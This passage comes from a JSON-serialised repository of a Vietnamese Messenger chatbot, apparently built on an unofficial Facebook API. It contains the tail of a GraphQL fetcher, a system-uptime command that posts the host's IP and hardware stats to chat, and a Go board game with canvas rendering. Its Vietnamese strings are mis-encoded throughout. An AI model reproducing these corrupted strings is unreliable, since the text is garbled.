\"5009315269112105\",\n          query_params: {\n            ids: [id]\n          }\n        }\n      }),\n      batch_name: \"MessengerParticipantsFetcher\"\n    };\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function(resData) {\n      if (resData.error) {\n        throw resData;\n      }\n      // This returns us an array of things. The last one is the success /\n      // failure one.\n      // @TODO What do we do in this case?\n      if (resData[resData.length - 1].error_results !== 0) {\n        console.error(\"GetThreadInfo\", \"B·∫°n ƒêang B·ªã ƒÇn Get V√¨ S·ª≠ D·ª•ng Qu√° Nhi·ªÅu !\");\n      }\n        callback(null, resData);\n    })\n    .catch(function(err) {\n      log.error(\"getThreadInfoGraphQL\", \"L·ªói: getUserInfoV5 C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n    return callback(err);\n  });\n    return returnPromise;\n    };\n};","path":null,"size_bytes":1883,"size_tokens":null},"modules/commands/upt1.js":{"content":"const os = require('os'); \nconst moment = require('moment-timezone');\nconst fs = require('fs').promises;\nconst osu = require('os-utils');\nconst { performance } = require('perf_hooks');\nconst checkDiskSpace = require('check-disk-space').default;\n\nmodule.exports.config = {\n    name: \"upt1\",\n    version: \"2.0.0\",\n    hasPermission: 1,\n    credits: \"Vtuan\",\n    description: \"Hi·ªÉn th·ªã th√¥ng tin h·ªá th·ªëng c·ªßa bot\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"\",\n    cooldowns: 5\n};\n\nasync function getDependencyCount() {\n    try {\n        const packageJsonString = await fs.readFile('package.json', 'utf8');\n        const packageJson = JSON.parse(packageJsonString);\n        const depCount = Object.keys(packageJson.dependencies || {}).length;\n        const devDepCount = Object.keys(packageJson.devDependencies || {}).length;\n        return { depCount, devDepCount };\n    } catch (error) {\n        console.error('Kh√¥ng th·ªÉ ƒë·ªçc file package.json:', error);\n        return { depCount: -1, devDepCount: -1 };\n    }\n}\n\nfunction getStatusByPing(ping) {\n    if (ping < 200) {\n        return 't·ªët';\n    } else if (ping < 800) {\n        return 'b√¨nh th∆∞·ªùng';\n    } else {\n        return 'x·∫•u';\n    }\n}\n\nfunction getPrimaryIP() {\n    const interfaces = os.networkInterfaces();\n    for (let iface of Object.values(interfaces)) {\n        for (let alias of iface) {\n            if (alias.family === 'IPv4' && !alias.internal) {\n                return alias.address;\n            }\n        }\n    }\n    return '127.0.0.1';\n}\n\nmodule.exports.run = async ({ api, event, Users }) => {\n    const start = performance.now();  // B·∫Øt ƒë·∫ßu ƒëo th·ªùi gian x·ª≠ l√Ω\n\n    // L·∫•y th√¥ng tin h·ªá th·ªëng v√† g·ª≠i\n    const totalMemory = os.totalmem();\n    const freeMemory = os.freemem();\n    const usedMemory = totalMemory - freeMemory;\n    const uptime = process.uptime();\n\n    const { depCount, devDepCount } = await getDependencyCount();\n    let name = await Users.getNameUser(event.senderID);\n    const primaryIp = getPrimaryIP();\n    const botStatus = getStatusByPing(Date.now() - event.timestamp);\n\n    const uptimeHours = Math.floor(uptime / (60 * 60));\n    const uptimeMinutes = Math.floor((uptime % (60 * 60)) / 60);\n    const uptimeSeconds = Math.floor(uptime % 60);\n\n    const uptimeString = `${uptimeHours.toString().padStart(2, '0')}:${uptimeMinutes.toString().padStart(2, '0')}:${uptimeSeconds.toString().padStart(2, '0')}`;\n\n    checkDiskSpace('C:').then((diskSpace) => {\n        const freeDiskSpace = (diskSpace.free / 1024 / 1024 / 1024).toFixed(2); // ƒê∆°n v·ªã GB\n\n        osu.cpuUsage(function (cpuUsage) {\n            const end = performance.now();  // K·∫øt th√∫c ƒëo th·ªùi gian x·ª≠ l√Ω\n            const processingTime = ((end - start) / 1000).toFixed(3);  // Th·ªùi gian x·ª≠ l√Ω, hi·ªÉn th·ªã d∆∞·ªõi d·∫°ng gi√¢y\n\n            const replyMsg = `\nñ¢® ¬∑ B√¢y gi·ªù l√†: ${moment().tz('Asia/Ho_Chi_Minh').format('HH:mm:ss')} || ${moment().tz('Asia/Ho_Chi_Minh').format('DD/MM/YYYY')}\nñ¢® ¬∑ Th·ªùi gian ƒë√£ ho·∫°t ƒë·ªông: ${uptimeString}\nñ¢® ¬∑ Prefix m·∫∑c ƒë·ªãnh: ${global.config.PREFIX}\nñ¢® ¬∑ ƒê·ªãa ch·ªâ IP: ${primaryIp}\nñ¢® ¬∑ T·ªïng s·ªë dependencies: ${depCount}\nñ¢® ¬∑ T·ªïng s·ªë devDependencies: ${devDepCount}\nñ¢® ¬∑ T√¨nh tr·∫°ng bot: ${botStatus}\nñ¢® ¬∑ T·ªïng ng∆∞·ªùi d√πng: ${global.data.allUserID.length}\nñ¢® ¬∑ T·ªïng nh√≥m: ${global.data.allThreadID.length}\nñ¢® ¬∑ Th√¥ng tin h·ªá th·ªëng:\nñ¢® ¬∑ H·ªá ƒëi·ªÅu h√†nh: ${os.type()} ${os.release()} (${os.arch()})\nñ¢® ¬∑ CPU: ${os.cpus().length} core(s) - ${os.cpus()[0].model.trim()} @ ${os.cpus()[0].speed}MHz\nñ¢® ¬∑ CPU ƒë√£ s·ª≠ d·ª•ng: ${(cpuUsage * 100).toFixed(1)}%\nñ¢® ¬∑ RAM: ${(usedMemory / 1024 / 1024 / 1024).toFixed(2)}GB/${(totalMemory / 1024 / 1024 / 1024).toFixed(2)}GB (Used/Total)\nñ¢® ¬∑ RAM tr·ªëng: ${(freeMemory / 1024 / 1024 / 1024).toFixed(2)}GB\nñ¢® ¬∑ Dung l∆∞·ª£ng tr·ªëng : ${freeDiskSpace}GB\nñ¢® ¬∑ Ping: ${Date.now() - event.timestamp}ms\nñ¢® ¬∑ Th·ªùi gian x·ª≠ l√Ω: ${processingTime} gi√¢y\nñ¢® ¬∑ Y√™u c·∫ßu b·ªüi: ${name}\n            `.trim();\n\n            // G·ª≠i th√¥ng tin h·ªá th·ªëng\n            api.sendMessage(replyMsg, event.threadID, event.messageID);\n        });\n    }).catch((err) => {\n        console.error('Kh√¥ng th·ªÉ l·∫•y th√¥ng tin ·ªï ƒëƒ©a:', err);\n    });\n};\n\nmodule.exports.handleEvent = async ({ event, api, Users, Threads }) => {\n    const { threadID, body } = event;\n\n    // Ki·ªÉm tra n·∫øu tin nh·∫Øn ch·ª©a t·ª´ kh√≥a upt1\n    const keywords = [\"upt1\", \"uptime1\"];\n    if (keywords.some(keyword => body.toLowerCase().includes(keyword))) {\n        await module.exports.run({ api, event, Users, Threads });\n    }\n};\n","path":null,"size_bytes":4700,"size_tokens":null},"modules/commands/covay.js":{"content":"const { createCanvas } = require('canvas');\nconst fs = require('fs').promises;\nconst path = require('path');\n\nconst gameRooms = new Map();\nconst playerStates = new Map();\nconst BoardSize = 19;\nconst Columns = 'ABCDEFGHJKLMNOPQRST';\nconst Directions = [[-1, 0], [1, 0], [0, -1], [0, 1]];\nconst StarPoints = [[3,3],[3,9],[3,15],[9,3],[9,9],[9,15],[15,3],[15,9],[15,15]];\n\nmodule.exports.config = {\n    name: \"covay\",\n    version: \"2.0.1\",\n    hasPermssion: 0,\n    credits: \"lechii\",\n    description: \"Game c·ªù v√¢y\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"[create|join|start|info|end|pass|resign]\",\n    cooldowns: 2,\n};\n\nmodule.exports.handleReply = async ({ api, event, handleReply }) => {\n    const { threadID, messageID, senderID, body } = event;\n    const game = gameRooms.get(threadID);\n\n    if (!game || game.status !== 'playing' || senderID !== game.players[game.currentPlayer]) {\n        return api.sendMessage(\"‚ùå Kh√¥ng ph·∫£i l∆∞·ª£t c·ªßa b·∫°n!\", threadID, messageID);\n    }\n\n    const move = parseMove(body.trim().toUpperCase());\n    if (!move) {\n        return api.sendMessage(\"‚ùå T·ªça ƒë·ªô kh√¥ng h·ª£p l·ªá! VD: D4, A1, T19\", threadID, messageID);\n    }\n\n    const result = game.makeMove(move.col, move.row);\n    if (!result.success) {\n        return api.sendMessage(`‚ùå ${result.error}`, threadID, messageID);\n    }\n\n    const moveNotation = `${Columns[move.col]}${BoardSize - move.row}`;\n    const currentPlayerId = game.players[1 - game.currentPlayer];\n    const nextPlayerId = game.players[game.currentPlayer];\n    const playerIcon = game.currentPlayer === 1 ? '‚ö´' : '‚ö™';\n    const nextPlayerIcon = game.currentPlayer === 0 ? '‚ö´' : '‚ö™';\n\n    const [currentPlayerInfo, nextPlayerInfo] = await Promise.all([\n        api.getUserInfo(currentPlayerId),\n        api.getUserInfo(nextPlayerId)\n    ]);\n\n    const currentPlayerName = currentPlayerInfo[currentPlayerId]?.name || currentPlayerId;\n    const nextPlayerName = nextPlayerInfo[nextPlayerId]?.name || nextPlayerId;\n\n    let message = `${playerIcon} ƒë√£ ƒë√°nh: ${moveNotation} (${currentPlayerName})\\n`;\n    if (result.captured > 0) message += `üéØ b·∫Øt ƒë∆∞·ª£c: ${result.captured} qu√¢n\\n`;\n    message += `\\n${nextPlayerIcon} l∆∞·ª£t ti·∫øp theo: ${nextPlayerName}\\nüìç n∆∞·ªõc th·ª©: ${game.moves.length}`;\n\n    await sendBoardMessage(api, threadID, game, message);\n};\n\nclass GoGame {\n    constructor(roomId, creator) {\n        this.roomId = roomId;\n        this.creator = creator;\n        this.players = [creator];\n        this.status = 'waiting';\n        this.board = Array(BoardSize).fill().map(() => Array(BoardSize).fill(null));\n        this.moves = [];\n        this.currentPlayer = 0;\n        this.capturedStones = { black: 0, white: 0 };\n        this.passCount = 0;\n        this.koBoard = null;\n        this.endVotes = new Set();\n    }\n\n    addPlayer(userId) {\n        return this.players.length < 2 && !this.players.includes(userId) && (this.players.push(userId));\n    }\n\n    isValidMove(col, row) {\n        return col >= 0 && col < BoardSize && row >= 0 && row < BoardSize && this.board[row][col] === null;\n    }\n\n    getNeighbors(col, row) {\n        return Directions\n            .map(([dx, dy]) => [col + dx, row + dy])\n            .filter(([c, r]) => c >= 0 && c < BoardSize && r >= 0 && r < BoardSize);\n    }\n\n    getGroup(col, row, color) {\n        const group = new Set();\n        const stack = [[col, row]];\n\n        while (stack.length > 0) {\n            const [c, r] = stack.pop();\n            const key = `${c},${r}`;\n            if (group.has(key) || this.board[r][c] !== color) continue;\n\n            group.add(key);\n            this.getNeighbors(c, r).forEach(([nc, nr]) => {\n                if (!group.has(`${nc},${nr}`)) stack.push([nc, nr]);\n            });\n        }\n\n        return Array.from(group).map(key => key.split(',').map(Number));\n    }\n\n    hasLiberties(group) {\n        return group.some(([col, row]) =>\n            this.getNeighbors(col, row).some(([nc, nr]) => this.board[nr][nc] === null)\n        );\n    }\n\n    captureGroups(opponentColor) {\n        const captured = [];\n        const processed = new Set();\n\n        for (let row = 0; row < BoardSize; row++) {\n            for (let col = 0; col < BoardSize; col++) {\n                const key = `${col},${row}`;\n                if (this.board[row][col] === opponentColor && !processed.has(key)) {\n                    const group = this.getGroup(col, row, opponentColor);\n                    group.forEach(([c, r]) => processed.add(`${c},${r}`));\n\n                    if (!this.hasLiberties(group)) {\n                        group.forEach(([c, r]) => {\n                            this.board[r][c] = null;\n                            captured.push([c, r]);\n                        });\n                    }\n                }\n            }\n        }\n        return captured;\n    }\n\n    isSuicide(col, row, color) {\n        this.board[row][col] = color;\n        const group = this.getGroup(col, row, color);\n        const hasLiberties = this.hasLiberties(group);\n\n        const opponentColor = color === 'black' ? 'white' : 'black';\n        const canCapture = this.getNeighbors(col, row).some(([nc, nr]) =>\n            this.board[nr][nc] === opponentColor && !this.hasLiberties(this.getGroup(nc, nr, opponentColor))\n        );\n\n        this.board[row][col] = null;\n        return !hasLiberties && !canCapture;\n    }\n\n    boardToString() {\n        return this.board.map(row => row.map(cell => cell || 'empty').join(',')).join(';');\n    }\n\n    makeMove(col, row) {\n        const color = this.currentPlayer === 0 ? 'black' : 'white';\n\n        if (!this.isValidMove(col, row)) return { success: false, error: \"V·ªã tr√≠ kh√¥ng h·ª£p l·ªá\" };\n        if (this.isSuicide(col, row, color)) return { success: false, error: \"N∆∞·ªõc ƒëi t·ª± s√°t\" };\n\n        const prevBoard = this.boardToString();\n        this.board[row][col] = color;\n\n        const opponentColor = color === 'black' ? 'white' : 'black';\n        const captured = this.captureGroups(opponentColor);\n\n        if (this.koBoard === this.boardToString()) {\n            this.board[row][col] = null;\n            captured.forEach(([c, r]) => this.board[r][c] = opponentColor);\n            return { success: false, error: \"Vi ph·∫°m lu·∫≠t Ko\" };\n        }\n\n        this.moves.push({ col, row, color, captured: captured.length, moveNumber: this.moves.length + 1 });\n        this.capturedStones[color] += captured.length;\n        this.koBoard = prevBoard;\n        this.currentPlayer = 1 - this.currentPlayer;\n        this.passCount = 0;\n\n        return { success: true, captured: captured.length };\n    }\n\n    pass() {\n        this.passCount++;\n        const currentColor = this.currentPlayer === 0 ? 'black' : 'white';\n        this.currentPlayer = 1 - this.currentPlayer;\n        this.moves.push({ type: 'pass', player: currentColor, moveNumber: this.moves.length + 1 });\n\n        if (this.passCount >= 2) this.status = 'ended';\n        return this.passCount >= 2;\n    }\n\n    endGame() {\n        this.status = 'ended';\n        return { blackScore: this.capturedStones.black, whiteScore: this.capturedStones.white + 6.5 };\n    }\n}\n\nfunction createBoardImage(game) {\n    const cellSize = 30, margin = 50, canvasSize = BoardSize * cellSize + margin * 2;\n    const canvas = createCanvas(canvasSize, canvasSize);\n    const ctx = canvas.getContext('2d');\n\n    ctx.fillStyle = '#D2B48C';\n    ctx.fillRect(0, 0, canvasSize, canvasSize);\n\n    for (let i = 0; i < canvasSize; i += 2) {\n        ctx.fillStyle = i % 4 === 0 ? '#C8A882' : '#D6BC90';\n        ctx.fillRect(0, i, canvasSize, 1);\n    }\n\n    ctx.strokeStyle = '#8B4513';\n    ctx.lineWidth = 3;\n    ctx.strokeRect(margin - 15, margin - 15, BoardSize * cellSize + 30, BoardSize * cellSize + 30);\n\n    ctx.strokeStyle = '#654321';\n    ctx.lineWidth = 1.5;\n    for (let i = 0; i < BoardSize; i++) {\n        const pos = margin + i * cellSize;\n        ctx.beginPath();\n        ctx.moveTo(margin, pos);\n        ctx.lineTo(canvasSize - margin, pos);\n        ctx.moveTo(pos, margin);\n        ctx.lineTo(pos, canvasSize - margin);\n        ctx.stroke();\n    }\n\n    ctx.fillStyle = '#654321';\n    StarPoints.forEach(([x, y]) => {\n        ctx.beginPath();\n        ctx.arc(margin + x * cellSize, margin + y * cellSize, 4, 0, 2 * Math.PI);\n        ctx.fill();\n    });\n\n    for (let row = 0; row < BoardSize; row++) {\n        for (let col = 0; col < BoardSize; col++) {\n            const stone = game.board[row][col];\n            if (stone) {\n                const x = margin + col * cellSize;\n                const y = margin + row * cellSize;\n                const radius = 13;\n\n                ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';\n                ctx.beginPath();\n                ctx.arc(x + 2, y + 2, radius, 0, 2 * Math.PI);\n                ctx.fill();\n\n                const gradient = ctx.createRadialGradient(x - 4, y - 4, 0, x, y, radius);\n                if (stone === 'black') {\n                    gradient.addColorStop(0, '#4a4a4a');\n                    gradient.addColorStop(1, '#000000');\n                    ctx.fillStyle = gradient;\n                    ctx.beginPath();\n                    ctx.arc(x, y, radius, 0, 2 * Math.PI);\n                    ctx.fill();\n                    ctx.strokeStyle = '#000000';\n                    ctx.lineWidth = 1;\n                    ctx.stroke();\n                } else {\n                    gradient.addColorStop(0, '#ffffff');\n                    gradient.addColorStop(1, '#e0e0e0');\n                    ctx.fillStyle = gradient;\n                    ctx.beginPath();\n                    ctx.arc(x, y, radius, 0, 2 * Math.PI);\n                    ctx.fill();\n                    ctx.strokeStyle = '#666666';\n                    ctx.lineWidth = 1.5;\n                    ctx.stroke();\n                }\n            }\n        }\n    }\n\n    if (game.moves.length > 0) {\n        const lastMove = game.moves[game.moves.length - 1];\n        if (lastMove.col !== undefined && lastMove.row !== undefined) {\n            const x = margin + lastMove.col * cellSize;\n            const y = margin + lastMove.row * cellSize;\n            ctx.fillStyle = lastMove.color === 'black' ? '#ffffff' : '#000000';\n            ctx.font = 'bold 14px Arial';\n            ctx.textAlign = 'center';\n            ctx.textBaseline = 'middle';\n            ctx.fillText(game.moves.length.toString(), x, y);\n        }\n    }\n\n    ctx.fillStyle = '#654321';\n    ctx.font = 'bold 14px Arial';\n    ctx.textAlign = 'center';\n    ctx.textBaseline = 'middle';\n\n    for (let i = 0; i < BoardSize; i++) {\n        const pos = margin + i * cellSize;\n        const coordinate = Columns[i];\n        const number = (BoardSize - i).toString();\n        ctx.fillText(coordinate, pos, margin - 25);\n        ctx.fillText(coordinate, pos, canvasSize - margin + 25);\n        ctx.fillText(number, margin - 25, pos);\n        ctx.fillText(number, canvasSize - margin + 25, pos);\n    }\n\n    ctx.fillStyle = '#654321';\n    ctx.font = 'bold 12px Arial';\n    ctx.textAlign = 'center';\n    ctx.fillText(`‚ö´${game.capturedStones.black} ‚ö™${game.capturedStones.white}`, canvasSize / 2, canvasSize - 15);\n\n    return canvas.toBuffer('image/png');\n}\n\nasync function sendBoardMessage(api, threadID, game, message) {\n    try {\n        const boardBuffer = createBoardImage(game);\n        const tempPath = path.join(__dirname, `temp_board_${threadID}_${Date.now()}.png`);\n        await fs.writeFile(tempPath, boardBuffer);\n\n        api.sendMessage({\n            body: message,\n            attachment: require('fs').createReadStream(tempPath)\n        }, threadID, async (err, info) => {\n            try {\n                await fs.unlink(tempPath);\n            } catch (unlinkErr) {\n                console.error('L·ªói x√≥a file t·∫°m:', unlinkErr);\n            }\n            if (!err) {\n                global.client.handleReply.push({\n                    name: module.exports.config.name,\n                    messageID: info.messageID,\n                    author: threadID,\n                    type: 'move'\n                });\n            }\n        });\n    } catch (error) {\n        console.error('L·ªói t·∫°o h√¨nh ·∫£nh:', error);\n        api.sendMessage(message, threadID);\n    }\n}\n\nfunction parseMove(text) {\n    const match = text.match(/^([A-HJ-T])(\\d{1,2})$/);\n    if (!match) return null;\n\n    const col = Columns.indexOf(match[1]);\n    const row = BoardSize - parseInt(match[2]);\n\n    return (col === -1 || row < 0 || row >= BoardSize) ? null : { col, row };\n}\n\nmodule.exports.run = async function ({ api, event, args }) {\n    const { threadID, messageID, senderID } = event;\n    const command = args[0]?.toLowerCase();\n\n    try {\n        switch (command) {\n            case 'create': {\n                if (gameRooms.has(threadID)) {\n                    return api.sendMessage(\"‚ùå ƒê√£ c√≥ game trong nh√≥m n√†y! S·ª≠ d·ª•ng 'covay end' ƒë·ªÉ k·∫øt th√∫c.\", threadID, messageID);\n                }\n\n                const game = new GoGame(threadID, senderID);\n                gameRooms.set(threadID, game);\n                playerStates.set(senderID, threadID);\n\n                api.sendMessage(\"üî• GAME C·ªú V√ÇY ƒê√É ƒê∆Ø·ª¢C T·∫†O!\\n\\n\" +\n                    \"üìã C√°ch ch∆°i:\\n\" +\n                    \"‚Ä¢ `covay join` - Tham gia game (c·∫ßn 2 ng∆∞·ªùi)\\n\" +\n                    \"‚Ä¢ `covay start` - B·∫Øt ƒë·∫ßu game\\n\" +\n                    \"‚Ä¢ `covay info` - Xem th√¥ng tin game\\n\" +\n                    \"‚Ä¢ `covay end` - K·∫øt th√∫c game\\n\\n\" +\n                    \"‚ö´ Lu·∫≠t c·ªù v√¢y:\\n\" +\n                    \"‚Ä¢ Qu√¢n ƒëen ƒëi tr∆∞·ªõc\\n\" +\n                    \"‚Ä¢ B·∫Øt qu√¢n khi bao v√¢y ho√†n to√†n\\n\" +\n                    \"‚Ä¢ Kh√¥ng ƒë∆∞·ª£c ƒëi v√†o v·ªã tr√≠ t·ª± s√°t\\n\" +\n                    \"‚Ä¢ Lu·∫≠t Ko: kh√¥ng ƒë∆∞·ª£c l·∫∑p l·∫°i th·∫ø c·ªù\\n\" +\n                    \"‚Ä¢ Pass 2 l·∫ßn li√™n ti·∫øp = k·∫øt th√∫c game\\n\\n\", threadID, messageID);\n                break;\n            }\n\n            case 'join': {\n                const game = gameRooms.get(threadID);\n                if (!game) {\n                    return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o! S·ª≠ d·ª•ng 'covay create' ƒë·ªÉ t·∫°o.\", threadID, messageID);\n                }\n\n                if (game.status !== 'waiting') {\n                    return api.sendMessage(\"‚ùå Game ƒë√£ b·∫Øt ƒë·∫ßu ho·∫∑c k·∫øt th√∫c!\", threadID, messageID);\n                }\n\n                if (game.addPlayer(senderID)) {\n                    playerStates.set(senderID, threadID);\n                    const userInfo = await api.getUserInfo(senderID);\n                    const playerName = userInfo[senderID]?.name || senderID;\n                    api.sendMessage(`‚úÖ ${playerName} ƒë√£ tham gia game!\\n\\n` +\n                        `üë• Ng∆∞·ªùi ch∆°i: ${game.players.length}/2\\n` +\n                        `‚ö´ ƒêen: ${game.players[0]}\\n` +\n                        `‚ö™ Tr·∫Øng: ${game.players[1] || 'Ch·ªù...'}\\n\\n` +\n                        (game.players.length === 2 ? \"üéÆ S·∫µn s√†ng! S·ª≠ d·ª•ng 'covay start' ƒë·ªÉ b·∫Øt ƒë·∫ßu\" : \"‚è≥ Ch·ªù ng∆∞·ªùi ch∆°i th·ª© 2...\"), threadID, messageID);\n                } else {\n                    api.sendMessage(\"‚ùå Kh√¥ng th·ªÉ tham gia! (ƒê√£ ƒë·ªß ng∆∞·ªùi ho·∫∑c ƒë√£ tham gia)\", threadID, messageID);\n                }\n                break;\n            }\n\n            case 'start': {\n                const game = gameRooms.get(threadID);\n                if (!game) {\n                    return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o!\", threadID, messageID);\n                }\n\n                if (game.players.length < 2) {\n                    return api.sendMessage(\"‚ùå C·∫ßn ƒë·ªß 2 ng∆∞·ªùi ch∆°i!\", threadID, messageID);\n                }\n\n                if (game.status !== 'waiting') {\n                    return api.sendMessage(\"‚ùå Game ƒë√£ b·∫Øt ƒë·∫ßu ho·∫∑c k·∫øt th√∫c!\", threadID, messageID);\n                }\n\n                game.status = 'playing';\n\n                const [player1Info, player2Info] = await Promise.all([\n                    api.getUserInfo(game.players[0]),\n                    api.getUserInfo(game.players[1])\n                ]);\n\n                const player1Name = player1Info[game.players[0]]?.name || game.players[0];\n                const player2Name = player2Info[game.players[1]]?.name || game.players[1];\n\n                const message = \"üéÆ GAME B·∫ÆT ƒê·∫¶U!\\n\\n\" +\n                    `‚ö´ ƒêen: ${player1Name}\\n` +\n                    `‚ö™ Tr·∫Øng: ${player2Name}\\n\\n` +\n                    \"üéØ C√°ch ƒë√°nh:\\n\" +\n                    \"‚Ä¢ Reply tin nh·∫Øn n√†y v·ªõi t·ªça ƒë·ªô (VD: D4)\\n\" +\n                    \"‚Ä¢ `covay pass` - B·ªè l∆∞·ª£t\\n\" +\n                    \"‚Ä¢ `covay dauhang` - ƒê·∫ßu h√†ng\\n\\n\" +\n                    \"‚ö´ L∆∞·ª£t ƒë·∫ßu: QU√ÇN ƒêEN\";\n\n                await sendBoardMessage(api, threadID, game, message);\n                break;\n            }\n\n            case 'info': {\n                const game = gameRooms.get(threadID);\n                if (!game) {\n                    return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o!\", threadID, messageID);\n                }\n\n                const statusText = {\n                    waiting: \"‚è≥ Ch·ªù ng∆∞·ªùi ch∆°i\",\n                    playing: \"üéÆ ƒêang ch∆°i\",\n                    ended: \"üèÅ ƒê√£ k·∫øt th√∫c\"\n                };\n\n                let info = `üìä TH√îNG TIN GAME\\n\\nüéØ Tr·∫°ng th√°i: ${statusText[game.status]}\\nüë• Ng∆∞·ªùi ch∆°i: ${game.players.length}/2\\n`;\n\n                if (game.players.length > 0) {\n                    const [player1Info, player2Info] = await Promise.all([\n                        api.getUserInfo(game.players[0]),\n                        game.players.length > 1 ? api.getUserInfo(game.players[1]) : null\n                    ]);\n\n                    info += `‚ö´ ƒêen: ${player1Info[game.players[0]]?.name || game.players[0]}\\n`;\n                    if (game.players.length > 1) {\n                        info += `‚ö™ Tr·∫Øng: ${player2Info[game.players[1]]?.name || game.players[1]}\\n`;\n                    }\n                }\n\n                if (game.status === 'playing') {\n                    const currentPlayer = game.currentPlayer === 0 ? '‚ö´ ƒêen' : '‚ö™ Tr·∫Øng';\n                    info += `\\nüéØ L∆∞·ª£t hi·ªán t·∫°i: ${currentPlayer}\\nüî¢ N∆∞·ªõc ƒëi: ${game.moves.length}\\nüèÜ Qu√¢n b·∫Øt: ‚ö´${game.capturedStones.black} ‚ö™${game.capturedStones.white}`;\n                }\n\n                api.sendMessage(info, threadID, messageID);\n                break;\n            }\n\n            case 'pass': {\n                const game = gameRooms.get(threadID);\n                if (!game || game.status !== 'playing') {\n                    return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game ƒëang ch∆°i!\", threadID, messageID);\n                }\n\n                if (senderID !== game.players[game.currentPlayer]) {\n                    return api.sendMessage(\"‚ùå Kh√¥ng ph·∫£i l∆∞·ª£t c·ªßa b·∫°n!\", threadID, messageID);\n                }\n\n                const gameEnded = game.pass();\n\n                if (gameEnded) {\n                    const scores = game.endGame();\n                    api.sendMessage(`üèÅ GAME K·∫æT TH√öC!\\n\\nüìä ƒêi·ªÉm s·ªë:\\n‚ö´ ƒêen: ${scores.blackScore}\\n‚ö™ Tr·∫Øng: ${scores.whiteScore}\\n\\nüèÜ Ng∆∞·ªùi th·∫Øng: ${scores.blackScore > scores.whiteScore ? '‚ö´ ƒêen' : '‚ö™ Tr·∫Øng'}`, threadID, messageID);\n\n                    gameRooms.delete(threadID);\n                    game.players.forEach(p => playerStates.delete(p));\n                } else {\n                    const currentPlayerText = game.currentPlayer === 0 ? '‚ö´ ƒêen' : '‚ö™ Tr·∫Øng';\n                    await sendBoardMessage(api, threadID, game, `‚è≠Ô∏è PASS! ${game.passCount}/2\\n\\nüéØ L∆∞·ª£t ti·∫øp: ${currentPlayerText}`);\n                }\n                break;\n            }\n\n            case 'dauhang':\n            case 'resign': {\n                const game = gameRooms.get(threadID);\n                if (!game || game.status !== 'playing') {\n                    return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game ƒëang ch∆°i!\", threadID, messageID);\n                }\n\n                if (!game.players.includes(senderID)) {\n                    return api.sendMessage(\"‚ùå B·∫°n kh√¥ng ph·∫£i ng∆∞·ªùi ch∆°i!\", threadID, messageID);\n                }\n\n                const playerIndex = game.players.indexOf(senderID);\n                const winner = playerIndex === 0 ? '‚ö™ Tr·∫Øng' : '‚ö´ ƒêen';\n                const userInfo = await api.getUserInfo(senderID);\n                const playerName = userInfo[senderID]?.name || senderID;\n\n                api.sendMessage(`üè≥Ô∏è ƒê·∫¶U H√ÄNG!\\n\\nüò¢ ${playerName} ƒë√£ ƒë·∫ßu h√†ng\\nüèÜ Ng∆∞·ªùi th·∫Øng: ${winner}`, threadID, messageID);\n\n                gameRooms.delete(threadID);\n                game.players.forEach(p => playerStates.delete(p));\n                break;\n            }\n\n            case 'end': {\n                const game = gameRooms.get(threadID);\n                if (!game) {\n                    return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o!\", threadID, messageID);\n                }\n\n                if (!game.players.includes(senderID)) {\n                    return api.sendMessage(\"‚ùå Ch·ªâ ng∆∞·ªùi ch∆°i m·ªõi c√≥ th·ªÉ vote k·∫øt th√∫c game!\", threadID, messageID);\n                }\n\n                if (game.status === 'waiting') {\n                    if (senderID === game.creator) {\n                        gameRooms.delete(threadID);\n                        game.players.forEach(p => playerStates.delete(p));\n                        return api.sendMessage(\"üèÅ Game ƒë√£ ƒë∆∞·ª£c k·∫øt th√∫c!\", threadID, messageID);\n                    }\n                    return api.sendMessage(\"‚ùå Ch·ªâ ch·ªß ph√≤ng m·ªõi c√≥ th·ªÉ k·∫øt th√∫c game khi ch∆∞a b·∫Øt ƒë·∫ßu!\", threadID, messageID);\n                }\n\n                if (game.players.length < 2) {\n                    gameRooms.delete(threadID);\n                    game.players.forEach(p => playerStates.delete(p));\n                    return api.sendMessage(\"üèÅ Game ƒë√£ ƒë∆∞·ª£c k·∫øt th√∫c!\", threadID, messageID);\n                }\n\n                game.endVotes.add(senderID);\n                const userInfo = await api.getUserInfo(senderID);\n                const playerName = userInfo[senderID]?.name || senderID;\n\n                if (game.endVotes.size >= 2) {\n                    gameRooms.delete(threadID);\n                    game.players.forEach(p => playerStates.delete(p));\n                    api.sendMessage(\"üèÅ Game ƒë√£ ƒë∆∞·ª£c k·∫øt th√∫c theo th·ªèa thu·∫≠n c·ªßa c·∫£ 2 ng∆∞·ªùi ch∆°i!\", threadID, messageID);\n                } else {\n                    api.sendMessage(`üó≥Ô∏è ${playerName} ƒë√£ vote k·∫øt th√∫c game (${game.endVotes.size}/2)\\n‚è≥ C·∫ßn th√™m 1 vote n·ªØa ƒë·ªÉ k·∫øt th√∫c game`, threadID, messageID);\n                }\n                break;\n            }\n\n            default: {\n                api.sendMessage(\"üî• GAME C·ªú V√ÇY\\n\\n\" +\n                    \"üìã C√°ch ch∆°i:\\n\" +\n                    \"‚Ä¢ `covay create` - T·∫°o game m·ªõi\\n\" +\n                    \"‚Ä¢ `covay join` - Tham gia game (c·∫ßn 2 ng∆∞·ªùi)\\n\" +\n                    \"‚Ä¢ `covay start` - B·∫Øt ƒë·∫ßu game\\n\" +\n                    \"‚Ä¢ `covay info` - Xem th√¥ng tin game\\n\" +\n                    \"‚Ä¢ `covay pass` - B·ªè l∆∞·ª£t\\n\" +\n                    \"‚Ä¢ `covay dauhang` - ƒê·∫ßu h√†ng\\n\" +\n                    \"‚Ä¢ `covay end` - K·∫øt th√∫c game\\n\\n\" +\n                    \"üéØ Khi ƒë√°nh: Reply b√†n c·ªù v·ªõi t·ªça ƒë·ªô (VD: D4)\", threadID, messageID);\n                break;\n            }\n        }\n    } catch (error) {\n        console.error('L·ªói game c·ªù v√¢y:', error);\n        